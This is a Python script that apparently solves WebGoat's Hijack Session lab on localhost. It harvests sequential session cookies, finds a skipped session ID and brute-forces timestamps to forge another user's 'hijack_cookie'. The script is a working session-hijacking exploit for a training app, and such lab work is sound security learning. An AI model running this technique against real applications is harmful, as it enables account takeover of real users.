#!/usr/bin/env python3
import requests
import sys
import time

# ================= CONFIGURATION =================
BASE_URL = "http://127.0.0.1:8001"
LOGIN_PATH = "/WebGoat/HijackSession/login"   # exact case as in curl output
USERNAME = "username"          # from your working curl
PASSWORD = "username1"         # from your working curl
JSESSIONID = "EB470B908C0274C33BEA2AE192756D1C"  # fresh from curl
MAX_REQUESTS = 1000
# =================================================

def get_hijack_cookie(session):
    """Send login request, return hijack_cookie from response cookies."""
    url = f"{BASE_URL}{LOGIN_PATH}"
    params = {"username": USERNAME, "password": PASSWORD}
    headers = {"X-Requested-With": "XMLHttpRequest"}

    # Set JSESSIONID with correct path (case-sensitive)
    session.cookies.set("JSESSIONID", JSESSIONID, domain="127.0.0.1", path="/WebGoat")

    resp = session.post(url, params=params, headers=headers, timeout=5)
    if resp.status_code != 200:
        print(f"[!] HTTP {resp.status_code}, check WebGoat")
        return None

    # The cookie may or may not have a leading slash; keep as-is
    return resp.cookies.get("hijack_cookie")

def parse_cookie(cookie_value):
    """Remove optional leading slash, then split into session_id and timestamp."""
    if cookie_value.startswith('/'):
        cookie_value = cookie_value[1:]
    parts = cookie_value.split('-')
    return int(parts[0]), int(parts[1])

def try_hijack(session, session_id, timestamp):
    """Attempt to login with guessed hijack_cookie."""
    url = f"{BASE_URL}{LOGIN_PATH}"
    params = {"username": USERNAME, "password": PASSWORD}
    guessed_cookie = f"{session_id}-{timestamp}"   # without leading slash
    session.cookies.set("hijack_cookie", guessed_cookie, domain="127.0.0.1", path="/WebGoat")
    session.cookies.set("JSESSIONID", JSESSIONID, domain="127.0.0.1", path="/WebGoat")

    resp = session.post(url, params=params, headers={"X-Requested-With": "XMLHttpRequest"})
    data = resp.json()
    if data.get("lessonCompleted"):
        print(f"\n[+] SUCCESS! hijack_cookie = {guessed_cookie}")
        return True
    return False

def main():
    print("[*] Starting hijack_cookie brute-forcer...")
    session = requests.Session()

    prev_id = None
    prev_ts = None
    missing_id = None
    start_ts = None
    end_ts = None

    for i in range(1, MAX_REQUESTS + 1):
        cookie = get_hijack_cookie(session)
        if not cookie:
            print("[!] No hijack_cookie, retrying...")
            time.sleep(0.5)
            continue

        try:
            sess_id, ts = parse_cookie(cookie)
        except Exception as e:
            print(f"[!] Parse error: {e}, skipping")
            continue

        print(f"[{i:3d}] session_id = {sess_id}, timestamp = {ts}")

        if prev_id is not None:
            diff = sess_id - prev_id
            if diff == 2:
                missing_id = prev_id + 1
                start_ts = prev_ts
                end_ts = ts
                print(f"\n[+] GAP FOUND! Missing session ID = {missing_id}")
                print(f"[+] Timestamp range: {start_ts} → {end_ts}\n")
                break

        prev_id, prev_ts = sess_id, ts

    if missing_id is None:
        print("[!] No gap of exactly 2 found. Increase MAX_REQUESTS or restart WebGoat.")
        sys.exit(1)

    for ts in range(start_ts, end_ts + 1):
        print(f"[*] Trying timestamp {ts}...")
        if try_hijack(session, missing_id, ts):
            print("\n[+] Lesson completed!")
            return
        time.sleep(0.1)

    print("\n[-] No working hijack_cookie found in the timestamp range.")

if __name__ == "__main__":
    main()

```

